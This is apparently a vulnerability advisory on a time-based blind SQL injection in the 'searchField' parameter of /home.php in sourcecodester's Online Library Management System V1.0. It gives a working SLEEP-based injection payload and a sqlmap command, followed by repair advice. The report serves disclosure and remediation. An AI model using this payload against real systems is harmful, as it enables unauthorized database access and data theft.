# sourcecodester Online Library Management System V1.0 /home.php SQL injection

# NAME OF AFFECTED PRODUCT(S)
+ Online Library Management System

## Vendor Homepage
+ [homepage](https://www.sourcecodester.com/php/11454/online-library-management-system.html)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ WeQi

## Vulnerable File
+ /home.php

## Vulnerability location:
+ 'searchField' parameter

## VERSION(S)
+ V1.0

## Software Link
+ [Download Source Code](https://www.sourcecodester.com/download-code?nid=11454&title=Online+Library+Management+System)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/home.php' file of the 'Online Library Management System' project. The reason for this issue is that attackers inject malicious code from the parameter 'searchField' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
+ During the security review of "Online Library Management System", WeQi discovered a critical SQL injection vulnerability in the "/home.php" file. This vulnerability stems from insufficient user input validation of the 'searchField' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## Vulnerability type:

+ time-based blind

## Payload:
```plain
Parameter: searchField (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchList=bookId&searchField=123' AND (SELECT 1721 FROM (SELECT(SLEEP(5)))yePF) AND 'oFYP'='oFYP
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```plain
sqlmap -u "http://localhost/controller/home.php?searchList=bookId&searchField=123" --batch
```

![](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773062083359-89145702-e0cd-445e-b897-9bd28f5b3984.png)

# Suggested repair
1. **Use prepared statements and parameter binding:**

Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**

Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**

Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**

Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
